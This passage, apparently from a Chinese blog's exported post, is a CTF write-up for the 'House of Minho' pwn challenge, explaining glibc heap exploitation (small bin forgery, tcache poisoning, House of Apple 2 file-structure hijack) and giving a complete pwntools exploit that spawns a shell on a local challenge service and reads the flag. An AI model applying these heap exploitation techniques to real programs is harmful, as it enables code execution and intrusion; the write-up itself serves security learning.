class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0x00</span>) + p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: heap_base + <span class=\"number\">0x380</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc_base + <span class=\"number\">0x219ce0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这里加上了Small bin的伪造</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span> : &#123;</span><br><span class=\"line\">            <span class=\"number\">0x00</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x08</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x10</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x18</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x38</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x40</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x48</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x50</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0x50</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x58</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x60</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            <span class=\"number\">0x68</span>: libc_base + <span class=\"number\">0x219d60</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>此时堆布局如下</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118021620888.png\" alt=\"image-20231118021620888\"></p>\n<p>可以看到出现了错误，不过问题不大，源码时通过BK进行遍历的，在BK位置确实出现了3个Chunk</p>\n<p>此时我们就可以malloc(0x80)命中一次Small bin的0x90</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br></pre></td></tr></table></figure>\n\n<p>那么此时堆块就会变成，下面这样！WoW，我们可以控制Tcache bin 0x90位置的fd指针！并且此时0x90位置的Count有3！！！</p>\n<p><img src=\"/p/houseofminho-wp/image-20231118022002073.png\" alt=\"image-20231118022002073\"></p>\n<p>胜利的曙光就在眼前了，接下来是House of apple 2登场！</p>\n<h2 id=\"House-of-Apple-2\"><a href=\"#House-of-Apple-2\" class=\"headerlink\" title=\"House of Apple 2\"></a>House of Apple 2</h2><p>House of Apple 2的教程见<a href=\"https://bbs.kanxue.com/thread-273832.htm%EF%BC%8C%E8%BF%99%E9%87%8C%E8%86%9C%E6%8B%9C%E4%B8%80%E4%B8%8BOrz\">https://bbs.kanxue.com/thread-273832.htm，这里膜拜一下Orz</a></p>\n<p>经过我的调优可以简化到如下的布局</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system = <span class=\"number\">0x50d60</span> + libc_base</span><br><span class=\"line\">fake_file = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x0</span>: <span class=\"string\">b&quot;  sh;&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: system,</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: fake_file_addr-<span class=\"number\">0x10</span>, <span class=\"comment\"># wide data</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: fake_file_addr+<span class=\"number\">0x100</span>, <span class=\"comment\"># 可写，且内存为0即可</span></span><br><span class=\"line\">    <span class=\"number\">0xD0</span>: fake_file_addr+<span class=\"number\">0x28</span>-<span class=\"number\">0x68</span>, <span class=\"comment\"># wide data vtable</span></span><br><span class=\"line\">    <span class=\"number\">0xD8</span>: libc_base + <span class=\"number\">0x2160C0</span>, <span class=\"comment\"># vtable  </span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>我们需要结合当前的情况在做调整，首先我们需要再次延长可控的空间，方法也简单，毕竟Tcache bin的Count有3，我们可以先伪造一次fd到堆上，再伪造进入<code>_IO_list_all</code></p>\n<p>（为何不劫持Tcache bin管理块呢？因为我们只能拥有一个堆块，需要free之后再次malloc才能控制下一个，一旦劫持到Tcachebin 管理块，没有一个合适的size位置，是无法成功free的）</p>\n<p>由于大小范围可控需要0xe0长度，所以我们第一个堆块需要扩展一次，使用上面的0x50的堆块对下面0x90tcache的溢出修改，使得布局如下图，这样子Chunk 1申请出来的时候，可以保证能控制到Chunk 2的fd，依旧能继续攻击，也能延长可控范围到0xf0，使得攻击成立，而Chunk 1的size改为0x71是为了防止free之后进入0x90导致后面的Chunk无法取出</p>\n<p><img src=\"/p/houseofminho-wp/houseofminho_tcachebin.png\" alt=\"houseofminho_tcachebin\"></p>\n<p>那么经过简单的布置，最终攻击<code>_IO_list_all</code>之后，就完成了House of Apple 2的攻击</p>\n<h1 id=\"完整Exp\"><a href=\"#完整Exp\" class=\"headerlink\" title=\"完整Exp\"></a>完整Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&quot;./minho&quot;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5000</span>)</span><br><span class=\"line\">tob = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">str</span>(x).encode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;Size [1=small / 2=big]: &quot;</span>, tob(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;Data: &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">size_content, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;Size [1=small / 2=big]: &quot;</span>, size_content)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">b&quot;Data: &quot;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show2</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show3</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;2&quot;</span> + <span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free3</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&quot;&gt; &quot;</span>, <span class=\"string\">b&quot;0&quot;</span> * (<span class=\"built_in\">len</span>-<span class=\"number\">1</span>) + <span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free3(<span class=\"number\">0xd59</span>) <span class=\"comment\"># 这一行的作用见上文【伪造Unsorted bin】</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这一部分信息收集见上文【信息收集】</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xd11</span>))</span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0x219ce0</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;libc_base : <span class=\"subst\">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x48</span> + p64(<span class=\"number\">0xcf1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Data: &quot;</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span>)</span><br><span class=\"line\">heap_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&quot;\\x00&quot;</span>)) &lt;&lt; <span class=\"number\">12</span></span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;heap_base : <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 见上文【Unlink攻击以及Smallbin伪造攻击实施】</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x31</span>) + p64(heap_base+<span class=\"number\">0x2c0</span>) * <span class=\"number\">2</span> +  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0xd00</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x50</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0x00</span>) + p64(<span class=\"number\">0x11</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: heap_base + <span class=\"number\">0x380</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>: libc_base + <span class=\"number\">0x219ce0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">show2(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 见上文【修改Small bin】</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x10</span> : &#123;</span><br><span class=\"line\">            <span class=\"number\">0x00</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x08</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x10</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x18</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x38</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x40</span>: heap_base + <span class=\"number\">0x2c0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x48</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x50</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0x50</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">            <span class=\"number\">0x58</span>: <span class=\"number\">0x91</span>,</span><br><span class=\"line\">            <span class=\"number\">0x60</span>: heap_base + <span class=\"number\">0x2c0</span> + <span class=\"number\">0x30</span>,</span><br><span class=\"line\">            <span class=\"number\">0x68</span>: libc_base + <span class=\"number\">0x219d60</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">_IO_list_all = libc_base + <span class=\"number\">0x21a680</span></span><br><span class=\"line\">system = <span class=\"number\">0x50d60</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">fake_file = heap_base + <span class=\"number\">0x2e0</span></span><br><span class=\"line\"><span class=\"comment\"># 见上文House of apple 2中解释</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x10</span>+p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>) + p64((heap_base + <span class=\"number\">0x2d0</span> + <span class=\"number\">0x70</span>)^((heap_base)&gt;&gt;<span class=\"number\">12</span>)))</span><br><span class=\"line\">free()</span><br><span class=\"line\"><span class=\"comment\"># 这里是布置House of apple 2</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x0</span>+<span class=\"number\">0x10</span>: <span class=\"string\">b&quot;  sh;&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x28</span>+<span class=\"number\">0x10</span>: system,</span><br><span class=\"line\">    <span class=\"number\">0x68</span>: <span class=\"number\">0x71</span>,</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: _IO_list_all ^((heap_base)&gt;&gt;<span class=\"number\">12</span>),</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>-<span class=\"number\">0x60</span>: fake_file-<span class=\"number\">0x10</span>,</span><br><span class=\"line\">    <span class=\"number\">0xd0</span>-<span class=\"number\">0x60</span>: fake_file+<span class=\"number\">0x28</span>-<span class=\"number\">0x68</span>,</span><br><span class=\"line\">    <span class=\"number\">0xD8</span>-<span class=\"number\">0x60</span>: libc_base + <span class=\"number\">0x2160C0</span>, <span class=\"comment\"># jumptable </span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">2</span>, p64(fake_file))</span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;0&quot;</span>)</span><br><span class=\"line\">pause(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;cat /flag*&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/houseofminho-wp/image-20231118024517191.png\" alt=\"image-20231118024517191\"></p>\n<p>Flag获得完结撒花！</p>\n","path":"/p/houseofminho-wp/","permalink":"https://blog.csome.cc/p/houseofminho-wp/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"2023BlackHat","_id":"cuid36_4Cqhoj-kRf95u45ypF","slug":"2023BlackHat","path":"tags/2023BlackHat/","permalink":"https://blog.csome.cc/tags/2023BlackHat/","length":1}],"categories":[],"prev":{"title":"[2023春秋杯冬季赛]Pwn HouseofSome wp","date":"2024-01-23T14:40:38.000Z","slug":"houseofsome-ichunqiu","published":true,"updated":"2025-10-28T08:00:40.775Z","_id":"cuidbZigRKQOKUj9c7ok9GX0l","layout":"post","photos":[],"excerpt":"","path":"/p/houseofsome-ichunqiu/","permalink":"https://blog.csome.cc/p/houseofsome-ichunqiu/","__post":true},"next":{"title":"Bring back the stack attack -- House of some一种高版本glibc的利用思路","date":"2023-11-17T14:21:52.000Z","slug":"house-of-some","published":true,"updated":"2025-10-28T08:00:40.767Z","_id":"cuidQMgQCOE0Lk_CVlxZJYvpX","layout":"post","photos":[],"excerpt":"","path":"/p/house-of-some/","permalink":"https://blog.csome.cc/p/house-of-some/","__post":true},"__post":true}